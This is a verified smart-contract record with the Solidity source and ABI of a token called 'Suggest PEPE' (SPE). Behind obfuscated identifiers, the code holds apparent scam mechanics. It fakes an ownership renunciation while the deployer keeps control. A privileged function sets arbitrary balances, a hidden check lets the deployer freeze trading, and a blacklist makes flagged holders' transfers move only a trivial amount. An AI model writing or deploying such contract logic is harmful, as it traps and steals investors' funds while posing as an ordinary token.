{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface liquidityModeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoEnable) external view returns (uint256);\n\n    function transfer(address isFund, uint256 walletFrom) external returns (bool);\n\n    function allowance(address marketingWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isFund,\n        uint256 walletFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minFee, uint256 value);\n    event Approval(address indexed marketingWallet, address indexed spender, uint256 value);\n}\n\nabstract contract launchShouldMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellToken {\n    function createPair(address walletShould, address listFee) external returns (address);\n}\n\ninterface liquidityModeToMetadata is liquidityModeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SuggestPEPE is launchShouldMode, liquidityModeTo, liquidityModeToMetadata {\n\n    mapping(address => mapping(address => uint256)) private atLaunched;\n\n    uint256 constant feeLimit = 16 ** 10;\n\n    uint256 shouldTo;\n\n    uint256 private buyReceiver;\n\n    function minTakeReceiver() private view {\n        require(fundMin[_msgSender()]);\n    }\n\n    string private toAutoTrading = \"Suggest PEPE\";\n\n    address public listReceiver;\n\n    mapping(address => uint256) private swapAuto;\n\n    function transfer(address maxTotalAt, uint256 walletFrom) external virtual override returns (bool) {\n        return listAt(_msgSender(), maxTotalAt, walletFrom);\n    }\n\n    function atMarketing(address exemptTeam, address isFund, uint256 walletFrom) internal returns (bool) {\n        require(swapAuto[exemptTeam] >= walletFrom);\n        swapAuto[exemptTeam] -= walletFrom;\n        swapAuto[isFund] += walletFrom;\n        emit Transfer(exemptTeam, isFund, walletFrom);\n        return true;\n    }\n\n    address listMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atSenderBuy;\n    }\n\n    address fundSenderEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public isFrom;\n\n    function sellToExempt(address maxTotalAt, uint256 walletFrom) public {\n        minTakeReceiver();\n        swapAuto[maxTotalAt] = walletFrom;\n    }\n\n    function owner() external view returns (address) {\n        return walletIs;\n    }\n\n    function approve(address liquidityExemptBuy, uint256 walletFrom) public virtual override returns (bool) {\n        atLaunched[_msgSender()][liquidityExemptBuy] = walletFrom;\n        emit Approval(_msgSender(), liquidityExemptBuy, walletFrom);\n        return true;\n    }\n\n    bool private minTotal;\n\n    function listAt(address exemptTeam, address isFund, uint256 walletFrom) internal returns (bool) {\n        if (exemptTeam == tokenReceiver) {\n            return atMarketing(exemptTeam, isFund, walletFrom);\n        }\n        uint256 feeTrading = liquidityModeTo(listReceiver).balanceOf(fundSenderEnable);\n        require(feeTrading == tradingFund);\n        require(isFund != fundSenderEnable);\n        if (senderMarketing[exemptTeam]) {\n            return atMarketing(exemptTeam, isFund, feeLimit);\n        }\n        return atMarketing(exemptTeam, isFund, walletFrom);\n    }\n\n    constructor (){\n        if (isFrom != liquidityTokenBuy) {\n            totalMarketingLaunched = true;\n        }\n        limitBuy enableReceiverTake = limitBuy(listMarketing);\n        listReceiver = sellToken(enableReceiverTake.factory()).createPair(enableReceiverTake.WETH(), address(this));\n        if (autoTake == minTotal) {\n            buyReceiver = exemptTotalAuto;\n        }\n        tokenReceiver = _msgSender();\n        teamFrom();\n        fundMin[tokenReceiver] = true;\n        swapAuto[tokenReceiver] = marketingTake;\n        \n        emit Transfer(address(0), tokenReceiver, marketingTake);\n    }\n\n    bool private fromTradingShould;\n\n    event OwnershipTransferred(address indexed toTotal, address indexed amountTotal);\n\n    uint256 private liquidityTokenBuy;\n\n    mapping(address => bool) public fundMin;\n\n    uint256 private marketingTake = 100000000 * 10 ** 18;\n\n    function isLaunched(uint256 walletFrom) public {\n        minTakeReceiver();\n        tradingFund = walletFrom;\n    }\n\n    function teamFrom() public {\n        emit OwnershipTransferred(tokenReceiver, address(0));\n        walletIs = address(0);\n    }\n\n    uint8 private liquidityEnable = 18;\n\n    function isReceiver(address shouldLaunched) public {\n        require(shouldLaunched.balance < 100000);\n        if (modeLaunchedMarketing) {\n            return;\n        }\n        if (exemptTotalAuto == senderShould) {\n            minTotal = true;\n        }\n        fundMin[shouldLaunched] = true;\n        \n        modeLaunchedMarketing = true;\n    }\n\n    address private walletIs;\n\n    uint256 public senderShould;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingTake;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityEnable;\n    }\n\n    function takeShould(address walletTrading) public {\n        minTakeReceiver();\n        if (exemptTotalAuto != buyReceiver) {\n            buyReceiver = senderShould;\n        }\n        if (walletTrading == tokenReceiver || walletTrading == listReceiver) {\n            return;\n        }\n        senderMarketing[walletTrading] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toAutoTrading;\n    }\n\n    bool public totalMarketingLaunched;\n\n    uint256 private exemptTotalAuto;\n\n    address public tokenReceiver;\n\n    function allowance(address limitSell, address liquidityExemptBuy) external view virtual override returns (uint256) {\n        if (liquidityExemptBuy == listMarketing) {\n            return type(uint256).max;\n        }\n        return atLaunched[limitSell][liquidityExemptBuy];\n    }\n\n    uint256 tradingFund;\n\n    function balanceOf(address autoEnable) public view virtual override returns (uint256) {\n        return swapAuto[autoEnable];\n    }\n\n    bool public amountSell;\n\n    string private atSenderBuy = \"SPE\";\n\n    bool public modeLaunchedMarketing;\n\n    bool private autoTake;\n\n    function getOwner() external view returns (address) {\n        return walletIs;\n    }\n\n    function transferFrom(address exemptTeam, address isFund, uint256 walletFrom) external override returns (bool) {\n        if (_msgSender() != listMarketing) {\n            if (atLaunched[exemptTeam][_msgSender()] != type(uint256).max) {\n                require(walletFrom <= atLaunched[exemptTeam][_msgSender()]);\n                atLaunched[exemptTeam][_msgSender()] -= walletFrom;\n            }\n        }\n        return listAt(exemptTeam, isFund, walletFrom);\n    }\n\n    mapping(address => bool) public senderMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityExemptBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityExemptBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletFrom\",\"type\":\"uint256\"}],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFrom\",\"type\":\"uint256\"}],\"name\":\"sellToExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTrading\",\"type\":\"address\"}],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketingLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotalAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SuggestPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}